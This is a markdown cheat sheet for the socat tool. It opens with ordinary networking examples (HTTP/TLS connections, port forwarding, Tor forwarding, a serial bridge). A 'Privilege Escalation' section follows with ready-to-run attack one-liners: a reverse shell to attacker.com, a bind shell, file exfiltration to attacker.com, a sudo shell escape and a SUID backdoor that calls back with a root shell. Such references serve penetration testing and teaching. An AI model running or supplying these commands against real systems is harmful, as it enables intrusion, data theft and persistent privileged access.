
# socat

## Discription

**Socat** is a command line based utility that establishes two bidirectional byte streams and transfers data between them. Because the streams can be constructed from a large set of different types of data sinks and sources (see address types), and because lots of address options may be applied to the streams, socat can be used for many different purposes.


## Networking 

### socat connect to http-server (port 80 on 'butzel.info')

```bash
socat TCP4:butzel.info:80 -
```

### connect to https-server (port 443 on 'butzel.info' with tls)

```bash
socat openssl:butzel.info:443 -
```

### tcp-listener (port 3180), output as hexdump (-x) and fork for new connetions

socat -x tcp-listen:3180,fork -

### practical examples:
##complete real working http-example:  
(sleep is necessary to prevent socat closing socket before data received)

```bash
(echo -e "GET / HTTP/1.1\r\nHost: butzel.info\r\n\r" && sleep 1) \ 
| socat tcp4:butzel.info:80 -
```

### http to httpS 'Proxy' (for an webserver without TLS-Support)
```bash
socat OPENSSL-LISTEN:443,reuseaddr,pf=ip4,fork,cert=server.pem,cafile=client.crt,verify=0 TCP4-CONNECT:127.0.0.1:80
```

### port forwarding (e.g. own port 3180 to port 22(ssh) on target

```bash
socat TCP4-LISTEN:3180,reuseaddr,fork TCP4:butzel.info:ssh
```

### TOR-forwarding (needs tor-daemon on port 9050 running)

```bash
socat tcp4-listen:8080,reuseaddr,fork socks4A:127.0.0.1:t0rhidd3ns3rvice.onion:80,socksport=9050
```

### network (port 8266) to serial bridge (/dev/ttyUSB0 baudrate: 115200)

```bash
socat TCP4-LISTEN:8266,fork,reuseaddr /dev/ttyUSB0,raw,crnl,b115200
```

### udp to tcp

```bash
socat -u udp-recvfrom:1234,fork tcp:localhost:4321
```

## Privilege Escalation

### Shell
It can be used to break out from restricted environments by spawning an interactive system shell.

The resulting shell is not a proper TTY shell and lacks the prompt

```bash
socat stdin exec:/bin/sh
```

### Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

Run ```socat file:`tty`,raw,echo=0 tcp-listen:12345``` on the attacker box to receive the shell.

```bash
RHOST=attacker.com
RPORT=12345
socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
```
### Bind shell

Run ```socat FILE:`tty`,raw,echo=0 TCP:target.com:12345``` on the attacker box to connect to the shell.

```bash
LPORT=12345
socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

### File upload

It can exfiltrate files on the network.

Run ```socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat``` on the attacker box to collect the file.

```bash
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
```

### File download

Run ```socat -u file:file_to_send tcp-listen:12345,reuseaddr``` on the attacker box to send the file.

```bash
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
```
### Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

The resulting shell is not a proper TTY shell and lacks the prompt.

```bash
sudo socat stdin exec:/bin/sh
```

### Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via ```system()```-like invocations) it only works on systems like Debian (<= Stretch) that allow the default ```sh``` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

Run ```socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.

```bash
sudo install -m =xs $(which socat) .

RHOST=attacker.com
RPORT=12345
./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
```